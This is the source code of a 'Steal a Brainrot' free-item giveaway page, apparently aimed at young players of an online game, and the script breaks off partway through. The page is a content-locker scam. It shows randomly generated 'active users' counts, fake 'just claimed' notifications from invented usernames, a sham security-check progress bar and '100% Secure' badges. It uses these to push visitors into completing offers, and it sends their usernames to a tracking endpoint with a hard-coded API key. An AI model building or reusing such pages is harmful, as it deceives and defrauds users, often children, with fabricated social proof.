<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Steal a Brainrot</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Orbitron:wght@900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        /* === ORIGINAL STYLES (kept exactly as user provided) === */
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        html, body { margin: 0; padding: 0; min-height: 100vh; font-family: 'Cairo', Arial, sans-serif; position: relative; overflow-x: hidden; text-align: left; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect fill="%2354d33a" width="100" height="100"/><rect fill="%2363e645" width="50" height="50" x="25" y="25" opacity="0.8"/><rect fill="%234f8a2f" width="30" height="30" x="35" y="35" opacity="0.6"/></svg>') repeat; background-size: 100px 100px; background-position: center; -webkit-user-select: none; -ms-user-select: none; user-select: none; touch-action: manipulation; }
        body.no-scroll { overflow: hidden; position: fixed; width: 100%; height: 100%; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 10px; }
        .logo-container { text-align: center; padding: 10px 0 5px; }
        .logo-container img { max-width: 120px; filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.5)); }
        .top-bar { display: flex; justify-content: center; align-items: center; margin-bottom: 10px; }
        .active-users-box { background: #0066cc; border: 2px solid #fff; border-radius: 10px; padding: 8px 12px; display: flex; align-items: center; font-size: 0.9em; min-width: 150px; margin: 0; box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.09); font-weight: 900; font-family: 'Cairo', Arial, sans-serif; height: 38px; justify-content: center; cursor: pointer; transition: transform 0.17s cubic-bezier(.17, .67, .83, .67); will-change: transform; position: relative; overflow: hidden; }
        .active-users-box:after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent); transition: 0.5s; }
        .active-users-box:hover:after { left: 100%; }
        .active-users-box:active { transform: scale(1.09) rotate(-2deg); box-shadow: 0 0 0 6px #fff5, 0 2px 6px #0003; z-index: 2; filter: brightness(1.08); background: #0055aa; }
        .active-users-box span:first-child { color: #fff; margin-right: 6px; font-weight: 900; font-size: 0.9em; letter-spacing: 1px; }
        .active-users-count { font-weight: 900; font-family: 'Orbitron', 'Cairo', Arial, sans-serif; margin-left: 6px; font-size: 0.9em; color: #FFD700; text-shadow: 0 0 8px rgba(255, 215, 0, 0.8); }
        .select-title { margin: 15px 0 10px; text-align: center; font-size: 1.1em; color: #fff; font-family: 'Cairo', Arial, sans-serif; letter-spacing: .4px; font-weight: 900; text-shadow: 0 1px 5px #2225; padding: 6px 0; position: relative; }
        .select-title:after { content: ''; position: absolute; bottom: 0; left: 10%; width: 80%; height: 2px; background: linear-gradient(to right, transparent, #ffd700, transparent); }

        /* Items grid and cards (kept) */
        .items-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; width: 100%; }
        .item-card { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px #0002; padding: 8px 4px; display: flex; flex-direction: column; align-items: center; border: 1.5px solid #eee; cursor: pointer; transition: all 0.3s ease; will-change: transform; overflow: hidden; min-height: 100px; }
        .item-card:before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(45deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05)); opacity: 0; transition: opacity 0.3s; }
        .item-card:hover { transform: translateY(-3px); box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2); }
        .item-card:active { transform: scale(1.05) rotate(-1deg); box-shadow: 0 0 0 4px #ffd70033, 0 2px 8px #0003; z-index: 2; filter: brightness(1.08); }
        .item-card.selected { background: linear-gradient(135deg, #ffd700, #ffbf00); border: 1.5px solid #d4af37; box-shadow: 0 0 12px rgba(255, 215, 0, 0.7); animation: goldenGlow 1.5s infinite alternate; }
        @keyframes goldenGlow { from { box-shadow: 0 0 8px rgba(255, 215, 0, 0.5); } to { box-shadow: 0 0 20px rgba(255, 215, 0, 0.9); } }
        .item-img { width: 60px; height: 60px; object-fit: cover; border-radius: 6px; background: #eaeaea; margin-bottom: 6px; border: none; image-rendering: pixelated; box-shadow: 0 0 10px #0001; transition: box-shadow 0.12s, filter 0.12s; display: block; position: relative; z-index: 1; }
        .item-card.selected .item-img { box-shadow: 0 0 12px rgba(255, 215, 0, 0.8); filter: brightness(1.05) contrast(1.1); }
        .item-name { font-size: 0.75em; color: #333; font-family: 'Cairo', Arial, sans-serif; text-align: center; font-weight: 900; letter-spacing: .1px; margin-bottom: 0; line-height: 1.1; width: 100%; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; background: none; border-radius: 0; border: none; margin-top: 0; display: flex; align-items: center; justify-content: center; box-sizing: border-box; min-height: 16px; position: relative; z-index: 1; padding: 0 2px; }

        /* Continue button & messages (kept) */
        .selection-controls { text-align: center; padding: 5px 0 15px; min-height: 20px; }
        #continue-btn { display: none; position: fixed; bottom: 15px; left: 50%; transform: translateX(-50%); z-index: 1001; padding: 10px 25px; font-size: 1em; font-weight: 900; font-family: 'Cairo', Arial, sans-serif; color: white; background: #333333; border: none; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4); transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }
        #selection-limit-message { display: none; color: #ff4d4d; font-weight: bold; font-size: 0.9em; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5); }
        .cliameds { position: fixed; bottom: 60px; left: 8px; z-index: 9999; }
        .message { background-color: rgba(135, 206, 250, 0.85); display: flex; font-size: .65rem; align-items: center; padding: 6px 12px; border-radius: 5px; border: 1.5px solid rgba(238, 204, 159, 0.7); position: relative; overflow: hidden; box-shadow: 0 3px 10px rgba(0, 0, 0, 0.15); }
        .message:after { content: ''; position: absolute; top: -50%; left: -60%; width: 20%; height: 200%; background: rgba(255, 255, 255, 0.3); transform: rotate(30deg); transition: all 0.5s; }
        .message:hover:after { left: 120%; }
        .message .img { padding-right: 6px; z-index: 2; }
        .message .img img { width: 35px; background: #fff; border-radius: 50%; height: 35px; border: 1.5px solid #fff; box-shadow: 0 0 6px rgba(0, 0, 0, 0.3); }
        .message .more { z-index: 2; }
        .message .more div:first-child { font-weight: bold; color: #0066cc; }
        .message .more div:last-child { color: #333; font-weight: 700; }

        /* === UPDATED LOCKER STYLES - PROFESSIONAL & EYE-FRIENDLY === */
        .locker-overlay { 
            display: none; 
            position: fixed; 
            inset: 0; 
            background: rgba(0, 0, 0, 0.85); 
            z-index: 9999; 
            justify-content: center; 
            align-items: center; 
            overflow-y: auto; 
            padding: 10px; 
            animation: fadeIn 0.4s ease; 
        }
        @keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }
        .locker-box { 
            width: 100%; 
            max-width: 320px; 
            max-height: 85vh; 
            background: linear-gradient(135deg, #1a2a1a 0%, #2d3a2d 50%, #1a2a1a 100%); 
            padding: 20px; 
            border-radius: 16px; 
            text-align: center; 
            color: #e8f5e8; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); 
            position: relative; 
            display: flex; 
            flex-direction: column; 
            border: 1px solid rgba(84, 211, 58, 0.3); 
            overflow-y: auto; 
            font-family: 'Cairo', Arial, sans-serif;
        }
        .locker-header { 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            margin-bottom: 15px; 
            padding-bottom: 12px; 
            border-bottom: 1px solid rgba(255, 215, 0, 0.2); 
        }
        .locker-logo { 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            font-weight: 700; 
            color: #c8b15a; 
            font-size: 0.9rem; 
        }
        .locker-box h2 { 
            color: #c8b15a; 
            margin-bottom: 12px; 
            font-size: 1.2rem; 
            font-weight: 900;
        }
        .cta-strong { 
            font-size: 0.85rem; 
            font-weight: 600; 
            color: #e8f5e8; 
            margin-bottom: 15px; 
            line-height: 1.4; 
            background: rgba(200, 177, 90, 0.1); 
            padding: 10px; 
            border-radius: 8px; 
            border-left: 3px solid #c8b15a; 
        }
        .game-preview-locker { 
            display: flex; 
            align-items: center; 
            gap: 12px; 
            margin-bottom: 15px; 
            text-align: left; 
            background: rgba(0, 0, 0, 0.2); 
            padding: 12px; 
            border-radius: 10px; 
            border-left: 3px solid #c8b15a; 
        }
        .game-preview-locker img { 
            width: 50px; 
            height: 50px; 
            border-radius: 10px; 
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); 
        }
        .game-preview-content h3 { 
            margin: 0; 
            font-size: 0.9rem; 
            color: #e8f5e8; 
            line-height: 1.3; 
            font-weight: 700;
        }
        .file-info { 
            font-size: 0.75rem; 
            color: #b8c9b8; 
            margin-top: 4px; 
        }
        .platform-badge { 
            display: inline-block; 
            background: #c8b15a; 
            color: #1a2a1a; 
            padding: 4px 8px; 
            border-radius: 12px; 
            font-size: 0.7rem; 
            font-weight: bold; 
            margin-top: 5px; 
        }
        .progress-container { 
            margin: 15px 0; 
            background: rgba(0, 0, 0, 0.3); 
            padding: 12px; 
            border-radius: 10px; 
            border: 1px solid rgba(200, 177, 90, 0.2);
        }
        .progress-header { 
            display: flex; 
            justify-content: space-between; 
            margin-bottom: 8px; 
            font-size: 0.8rem; 
            color: #b8c9b8; 
        }
        .progress-bar { 
            width: 100%; 
            height: 6px; 
            background: #2a3a2a; 
            border-radius: 6px; 
            overflow: hidden; 
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.3); 
            margin-bottom: 8px; 
        }
        #progressFill { 
            width: 0%; 
            height: 100%; 
            background: linear-gradient(90deg, #c8b15a, #d4af37); 
            transition: width 0.4s ease; 
            border-radius: 6px; 
        }
        .progress-text { 
            font-size: 0.75rem; 
            color: #b8c9b8; 
            display: flex; 
            justify-content: space-between; 
        }
        #statusMessage { 
            margin-top: 12px; 
            font-weight: bold; 
            font-size: 0.8rem; 
            color: #c8b15a; 
            min-height: 20px; 
            line-height: 1.4; 
            background: rgba(200, 177, 90, 0.1); 
            padding: 8px; 
            border-radius: 6px; 
        }
        .close-btn { 
            position: absolute; 
            top: 12px; 
            right: 12px; 
            font-size: 18px; 
            color: #b8c9b8; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            width: 28px; 
            height: 28px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            border-radius: 50%; 
            z-index: 10; 
        }
        .close-btn:hover { 
            background: rgba(200, 177, 90, 0.2); 
            color: #c8b15a; 
            transform: scale(1.1); 
        }
        .offers-section { 
            margin-top: 15px; 
        }
        .offers-section h3 { 
            color: #c8b15a; 
            margin-bottom: 12px; 
            font-size: 0.95rem; 
            display: flex; 
            align-items: center; 
            gap: 6px; 
            justify-content: center; 
            font-weight: 700;
        }
        #offersList { 
            display: flex; 
            flex-direction: column; 
            gap: 8px; 
        }
        .offer-card { 
            background: linear-gradient(135deg, rgba(42, 58, 42, 0.8) 0%, rgba(58, 74, 58, 0.8) 100%); 
            border: 1px solid rgba(200, 177, 90, 0.3); 
            padding: 12px; 
            border-radius: 8px; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            position: relative; 
            overflow: hidden; 
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2); 
            min-height: 60px; 
        }
        .offer-card::before { 
            content: ""; 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 3px; 
            height: 100%; 
            background: linear-gradient(to bottom, #c8b15a, #d4af37); 
        }
        .offer-card:hover { 
            background: linear-gradient(135deg, rgba(58, 74, 58, 0.9) 0%, rgba(74, 90, 74, 0.9) 100%); 
            border-color: rgba(200, 177, 90, 0.5); 
            transform: translateY(-2px); 
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); 
        }
        .offer-content { 
            flex: 1; 
            text-align: left; 
            min-width: 0; 
        }
        .offer-title { 
            font-size: 0.8rem; 
            font-weight: 600; 
            color: #e8f5e8; 
            margin-bottom: 4px; 
            line-height: 1.2; 
            display: -webkit-box; 
            -webkit-line-clamp: 2; 
            -webkit-box-orient: vertical; 
            overflow: hidden; 
        }
        .offer-details { 
            display: flex; 
            gap: 6px; 
            font-size: 0.65rem; 
            color: #b8c9b8; 
            flex-wrap: wrap; 
        }
        .offer-detail { 
            display: flex; 
            align-items: center; 
            gap: 3px; 
            white-space: nowrap; 
        }
        .offer-badge { 
            background: linear-gradient(135deg, #c8b15a, #d4af37); 
            color: #1a2a1a; 
            padding: 3px 6px; 
            border-radius: 10px; 
            font-size: 0.6rem; 
            font-weight: bold; 
            white-space: nowrap; 
            box-shadow: 0 1px 3px rgba(200, 177, 90, 0.3); 
            flex-shrink: 0; 
        }
        .trust-badges { 
            display: flex; 
            justify-content: center; 
            gap: 10px; 
            margin-top: 15px; 
            padding-top: 12px; 
            border-top: 1px solid rgba(200, 177, 90, 0.2); 
        }
        .trust-badge { 
            display: flex; 
            align-items: center; 
            gap: 4px; 
            font-size: 0.65rem; 
            color: #b8c9b8; 
        }
        .trust-badge i { 
            color: #c8b15a; 
        }

        /* Purchase popup styles - updated to match */
        .purchase-popup { 
            display: none; 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background-color: rgba(0, 0, 0, 0.85); 
            z-index: 1000; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: linear-gradient(135deg, #1a2a1a 0%, #2d3a2d 100%); 
            padding: 20px; 
            border-radius: 12px; 
            width: 90%; 
            max-width: 320px; 
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); 
            text-align: center; 
            color: #e8f5e8; 
            margin: auto; 
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            border: 1px solid rgba(200, 177, 90, 0.3); 
        }
        .popup-header { 
            position: relative; 
            padding-bottom: 15px; 
            margin-bottom: 15px; 
        }
        .popup-header h3 { 
            font-size: 1.2rem; 
            margin: 0; 
            color: #c8b15a; 
            font-weight: 700; 
        }
        .popup-header:after { 
            content: ''; 
            position: absolute; 
            bottom: 0; 
            left: 10%; 
            right: 10%; 
            height: 2px; 
            background: linear-gradient(to right, transparent, #c8b15a, transparent); 
        }
        .selected-images-container { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            gap: 10px; 
            margin: 15px auto; 
            flex-wrap: wrap; 
        }
        .item-popup-image-small { 
            width: 55px; 
            height: 55px; 
            border-radius: 8px; 
            object-fit: cover; 
            border: 2px solid #c8b15a; 
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.3); 
        }
        .item-confirm { 
            font-size: 0.95rem; 
            margin: 15px 0; 
            color: #e8f5e8; 
            font-weight: 600; 
            line-height: 1.4; 
        }
        .input-group { 
            margin-bottom: 15px; 
            text-align: left; 
        }
        .input-group label { 
            display: none; 
        }
        .input-group input { 
            width: 100%; 
            padding: 12px; 
            background: rgba(255, 255, 255, 0.9); 
            color: #1a2a1a; 
            border: 1px solid #c8b15a; 
            border-radius: 6px; 
            font-size: 14px; 
            font-weight: 600; 
            font-family: 'Cairo', Arial, sans-serif;
        }
        .input-group input::placeholder { 
            color: #666; 
            font-weight: 600; 
        }
        .popup-buttons { 
            display: flex; 
            justify-content: space-between; 
            gap: 10px; 
        }
        .cancel-btn { 
            background: rgba(0, 0, 0, 0.3); 
            color: #e8f5e8; 
            border: 1px solid #c8b15a; 
            padding: 12px; 
            border-radius: 6px; 
            font-weight: bold; 
            cursor: pointer; 
            flex: 1; 
            font-size: 14px; 
            transition: all 0.3s; 
            font-family: 'Cairo', Arial, sans-serif;
        }
        .cancel-btn:hover { 
            background: rgba(200, 177, 90, 0.2); 
        }
        .free-btn { 
            background: linear-gradient(135deg, #c8b15a, #d4af37); 
            border: none; 
            padding: 12px; 
            border-radius: 6px; 
            cursor: pointer; 
            flex: 1; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            gap: 6px; 
            transition: all 0.3s; 
            font-family: 'Cairo', Arial, sans-serif;
        }
        .free-btn:hover { 
            background: linear-gradient(135deg, #d4af37, #c8b15a); 
            transform: translateY(-1px); 
        }
        .free-btn .free-badge { 
            color: #1a2a1a; 
            font-weight: 900; 
            display: flex; 
            align-items: center; 
            font-size: 14px; 
        }
        .free-btn .free-icon { 
            width: 18px; 
            height: 18px; 
            background: #1a2a1a; 
            border-radius: 50%; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #c8b15a; 
            font-weight: bold; 
            font-size: 12px; 
        }
        .folding { 
            margin: 20px auto; 
            width: 60px; 
            height: 60px; 
            position: relative; 
            transform: rotateZ(45deg); 
        }
        .square { 
            position: absolute; 
            top: 30%; 
            right: 30%; 
            width: 25px; 
            height: 25px; 
            background-color: #c8b15a; 
            transform: rotateZ(87deg); 
        }
        .folding .sk-cube { 
            float: left; 
            width: 50%; 
            height: 50%; 
            position: relative; 
            transform: scale(1.1); 
        }
        .folding .sk-cube:before { 
            content: ""; 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background-color: #c8b15a; 
            animation: sk-foldCubeAngle 2.4s infinite linear both; 
            transform-origin: 100% 100%; 
        }
        .folding .sk-cube2 { 
            transform: scale(1.1) rotateZ(90deg); 
        }
        .folding .sk-cube3 { 
            transform: scale(1.1) rotateZ(180deg); 
        }
        .folding .sk-cube4 { 
            transform: scale(1.1) rotateZ(270deg); 
        }
        .folding .sk-cube2:before { 
            animation-delay: 0.3s; 
        }
        .folding .sk-cube3:before { 
            animation-delay: 0.6s; 
        }
        .folding .sk-cube4:before { 
            animation-delay: 0.9s; 
        }
        @keyframes sk-foldCubeAngle { 
            0%, 10% { transform: perspective(140px) rotateX(-180deg); opacity: 0; } 
            25%, 75% { transform: perspective(140px) rotateX(0deg); opacity: 1; } 
            90%, 100% { transform: perspective(140px) rotateY(180deg); opacity: 0; } 
        }
        .searching-text { 
            color: #e8f5e8; 
            font-size: 16px; 
            margin-top: 15px; 
        }
        .result-username { 
            color: #c8b15a; 
            font-size: 18px; 
            font-weight: bold; 
            margin: 15px 0; 
        }
        .get-item-now-btn { 
            background: linear-gradient(135deg, #c8b15a, #d4af37); 
            color: #1a2a1a; 
            border: none; 
            padding: 12px; 
            border-radius: 6px; 
            font-weight: bold; 
            cursor: pointer; 
            width: 100%; 
            font-size: 15px; 
            margin-top: 15px; 
            transition: all 0.3s; 
            font-family: 'Cairo', Arial, sans-serif;
        }
        .get-item-now-btn:hover { 
            background: linear-gradient(135deg, #d4af37, #c8b15a); 
            transform: translateY(-1px); 
        }
        .d-none { 
            display: none !important; 
        }
        .user-error { 
            color: #ff6b6b; 
            font-size: 13px; 
            margin-top: 8px; 
            text-align: center; 
        }

        /* Responsive (kept) */
        @media (min-width: 480px) {
            .items-grid { gap: 10px; }
            .item-img { width: 65px; height: 65px; }
            .item-name { font-size: 0.8em; }
            .select-title { font-size: 1.2em; }
        }
        @media (min-width: 768px) {
            .items-grid { gap: 12px; }
            .item-img { width: 70px; height: 70px; }
            .item-name { font-size: 0.85em; }
            .select-title { font-size: 1.4em; }
            .active-users-box { font-size: 1em; min-width: 170px; padding: 10px 15px; height: 42px; }
            .locker-box { max-width: 400px; }
        }
        @media (min-width: 992px) {
            .items-grid { grid-template-columns: repeat(5, 1fr); gap: 15px; }
            .item-img { width: 80px; height: 80px; }
            .select-title { font-size: 1.5em; }
            .active-users-box { font-size: 1.1em; min-width: 190px; padding: 12px 18px; height: 48px; }
            .locker-box { max-width: 450px; }
        }

        /* === MINIMAL SAFETY FIXES (NON-INVASIVE) === */
        .avatar,
        .player-avatar,
        .character,
        .big-avatar,
        .avatar-3d,
        img.avatar-large,
        iframe.avatar-frame,
        canvas.avatar-canvas,
        .game-character {
            max-width: 220px !important;
            width: auto !important;
            height: auto !important;
            display: block !important;
            margin: 18px auto !important;
            transform: none !important;
            position: relative !important;
            left: auto !important;
            top: auto !important;
            z-index: 2 !important;
            pointer-events: auto !important;
        }

        #itemsGrid, .items-grid {
            padding-bottom: 160px;
        }

        #continue-btn {
            z-index: 11000 !important;
        }

        .cliameds { bottom: 120px !important; left: 12px !important; z-index: 11010 !important; }

        #locker, .locker-overlay { z-index: 12000 !important; }

        /* Small scrollbar polish */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-thumb { background: rgba(200, 177, 90, 0.5); border-radius: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.1); }

    </style>
</head>

<body>
    <!-- The rest of your HTML body remains exactly the same -->
    <div class="container">
        <div class="logo-container">
            <img src="https://static.wikia.nocookie.net/stealabr/images/7/76/Childhood_gambling.png" alt="Steal a Brainrot Logo">
        </div>

        <div class="select-title">
            STEAL A BRAINROT
        </div>

        <div class="top-bar">
            <div class="active-users-box">
                <span>Active users :</span>
                <span class="active-users-count" id="activeUsersCount"></span>
            </div>
        </div>

        <div class="select-title">
            SELECT UP TO 3 ITEMS YOU WISH TO GET FREE ITEM
        </div>

        <div class="selection-controls">
            <div id="selection-limit-message">You can only select up to 3 items.</div>
        </div>

        <div class="items-grid" id="itemsGrid">
            <!-- All items unchanged -->
            <div class="item-card">
                <img alt="Childhood gambling" class="item-img" src="https://i.postimg.cc/NFchdQhQ/Screenshot-2025-11-15-061735-Edited.png" />
                <div class="item-name">Celularcini Viciosini</div>
            </div>
            <div class="item-card">
                <img alt="Dragon Pepper" class="item-img" src="https://i.postimg.cc/YqzZCCMT/Los-Taco-Blocks-INGAME.webp" />
                <div class="item-name">LOS TACO BLOCKS</div>
            </div>
            <div class="item-card">
                <img alt="Dragomfruitini" class="item-img" src="https://i.postimg.cc/5015Y20j/Dul-Dul-Dul.webp" />
                <div class="item-name">Dul Dul Dul</div>
            </div>
            <div class="item-card">
                <img alt="Dragon cannelloni" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/3/31/Nah_uh.png" />
                <div class="item-name">Dragon cannelloni</div>
            </div>
            <div class="item-card">
                <img alt="67" class="item-img" src="https://i.postimg.cc/N0cGNLn8/BOIIIIIII-SIX-SEVEN-3F3F3F3F3F.webp" />
                <div class="item-name">67</div>
            </div>
            <div class="item-card">
                <img alt="Tralaledon" class="item-img" src="https://i.postimg.cc/FH4tDwTK/Lasecretcombinasion.webp" />
                <div class="item-name">La Secret Combinasion</div>
            </div>
            <div class="item-card">
                <img alt="Strawberry Elephant" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/5/58/Strawberryelephant.png" />
                <div class="item-name">Strawberry Elephant</div>
            </div>
            <div class="item-card">
                <img alt="ToToTo Sahur" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/d/d0/TO_TO_TO_SAHUR_IS_COOL.png" />
                <div class="item-name">ToToTo Sahur</div>
            </div>
            <div class="item-card">
                <img alt="Helicopterino" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/6/61/UPokf8FmxyJj4JnktOIdNuJvgtV0vcQRYJLslXal.png" />
                <div class="item-name">Helicopterino</div>
            </div>
            <div class="item-card">
                <img alt="Tictac sahur" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/c/c9/Tictac_Sahur_png.png" />
                <div class="item-name">Tictac sahur</div>
            </div>
            <div class="item-card">
                <img alt="Tung Tung sahur" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/e/e3/Tung_Tung_Tung_Sahur.png" />
                <div class="item-name">Tung Tung sahur</div>
            </div>
            <div class="item-card">
                <img alt="La vacca saturno" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/5/5f/Candy_La_Vacca_Saturno_Saturnita.png" />
                <div class="item-name">La vacca saturno</div>
            </div>
            <div class="item-card">
                <img alt="La grande" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/d/d8/Carti.png" />
                <div class="item-name">La grande</div>
            </div>
            <div class="item-card">
                <img alt="La Cucaracha" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/4/46/La_Cucaracha.png" />
                <div class="item-name">La Cucaracha</div>
            </div>
            <div class="item-card">
                <img alt="La Bros" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/5/53/BROOOOOOOO.png" />
                <div class="item-name">La Bros</div>
            </div>
        </div>

        <button id="continue-btn">Continue</button>
    </div>

    <div class="cliameds"></div>

    <div class="purchase-popup" id="purchase-popup">
        <div class="popup-content">
        </div>
    </div>

    <!-- LOCKER POPUP -->
    <div id="locker" class="locker-overlay">
        <div class="locker-box">
            <span class="close-btn" onclick="closeLocker()">√ó</span>

            <div class="locker-header">
                <div class="locker-logo">
                    <i class="fas fa-shield-alt"></i>
                    <span>Steal a Brainrot Secure items</span>
                </div>
            </div>

            <div class="game-preview-locker" id="gamePreviewLocker"></div>

            <h2>‚ö° Items Verification</h2>
            <p class="cta-strong">Complete one quick offer to unlock your items + exclusive bonus content!</p>

            <!-- Progress Bar -->
            <div class="progress-container">
                <div class="progress-header">
                    <span>Security Check</span>
                    <span id="progressPercent">0%</span>
                </div>
                <div class="progress-bar">
                    <div id="progressFill"></div>
                </div>
                <div class="progress-text">
                    <span>Preparing your items...</span>
                    <span>Secure</span>
                </div>
            </div>

            <p id="statusMessage">üîÑ Initializing secure items...</p>

            <!-- Offers Section (Shows after progress) -->
            <div id="offersSection" class="offers-section">
                <h3><i class="fas fa-gift"></i> Choose Your Offer</h3>
                <div id="offersList"></div>

                <div class="trust-badges">
                    <div class="trust-badge">
                        <i class="fas fa-shield-check"></i>
                        <span>100% Secure</span>
                    </div>
                    <div class="trust-badge">
                        <i class="fas fa-clock"></i>
                        <span>1-3 Minutes</span>
                    </div>
                    <div class="trust-badge">
                        <i class="fas fa-download"></i>
                        <span>Instant Access</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <audio id="dingSound" preload="auto">
        <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
    </audio>
    <audio id="clickSound" preload="auto">
        <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
    </audio>

    <!-- The JavaScript remains exactly the same -->
    <script>
        // Your original JavaScript code goes here exactly as you had it
        // LOCKER CONFIGURATION
        const API_KEY = "3b17a09c1ca2bba2d52ffadab4894374";
        const USER_ID = "504359";

        // If you have a specific locker delivery API endpoint, set it here:
        const LOCKER_API_URL = "https://d3k0q5ez56odtk.cloudfront.net/public/conversion/track.php";

        let currentPlatform = null;
        let progressInterval;

        function randomUsers() {
            return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
        }

        function updateActiveUsers() {
            document.getElementById('activeUsersCount').textContent = randomUsers();
        }
        updateActiveUsers();
        setInterval(updateActiveUsers, 4500);

        const avatars = [
            'https://dress2.pages.dev/avatars/avatar1.png', 'https://dress2.pages.dev/avatars/avatar2.png', 'https://dress2.pages.dev/avatars/avatar3.png', 'https://dress2.pages.dev/avatars/avatar4.png', 'https://dress2.pages.dev/avatars/avatar5.png', 'https://dress2.pages.dev/avatars/avatar6.png', 'https://dress2.pages.dev/avatars/avatar7.png', 'https://dress2.pages.dev/avatars/avatar8.png', 'https://dress2.pages.dev/avatars/avatar9.png', 'https://dress2.pages.dev/avatars/avatar10.png'
        ];
        const items = [
            'Super-Seed', 'Night-Egg', 'Candy-Blossom', 'Queen-bee', 'Dragonfly', 'Golden Lab ', ' Flower-Seed ', ' Dragon fruit', 'Mango', ' Grapwes', 'Mushroom', 'Star-Caller', 'Master-Sprinkler', 'Favorite-Tool', 'Harvest-tool', 'Honey-Sprinkler', 'Pepper', 'Cacao', 'Beanstalk',
        ];
        const usernames = [
            'MADELYN2', 'zontir99', 'marcos10', 'Queen_lisa1', 'LANA11', 'HAMZA22', 'tbonmk2', 'caroline34', 'dimaraja10', 'asktiyal9hba', 'ronaldo7', 'sidi_binzarn1', 'DERKAOUI_ZAML1', 'Tizit.botsot', 'Achnid22'
        ];
        let notificationInterval;
        let popupOpen = false;

        function startNotifications() {
            if (popupOpen) return;
            notificationInterval = setInterval(function() {
                if (popupOpen) return;
                $(".cliameds").fadeIn();
                var html = `
          <div class="message">
            <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
            <div class="more">
              <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
              <div> JUST CLAIMED '${items[Math.floor(Math.random() * items.length)]}'</div>
            </div>
          </div>
        `;
                $(".cliameds").html(html);
                setTimeout(function() {
                    $(".cliameds").fadeOut();
                }, 3000);
            }, 5000);
        }

        function stopNotifications() {
            clearInterval(notificationInterval);
            $(".cliameds").fadeOut();
        }
        startNotifications();

        function prepareLockerDelivery(username, itemNamesArray, itemImagesArray) {
            const payload = {
                user_id: USER_ID,
                api_key: API_KEY,
                action: "prepare_delivery",
                username: username,
                items: itemNamesArray,
                item_images: itemImagesArray,
                source: 'stealabrainrot.com',
                ts: Date.now()
            };

            try {
                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(LOCKER_API_URL, blob);
                    console.log('Locker prepare sent with sendBeacon', payload);
                    return;
                }
            } catch (e) { }

            fetch(LOCKER_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            })
            .then(res => { if (!res.ok) throw new Error('Network response not ok'); return res.text(); })
            .then(txt => { try { console.log('Locker prepare response', JSON.parse(txt)); } catch (e) { console.log('Locker prepare response', txt); } })
            .catch(err => { console.warn('Locker prepare failed (non-blocking):', err); });
        }

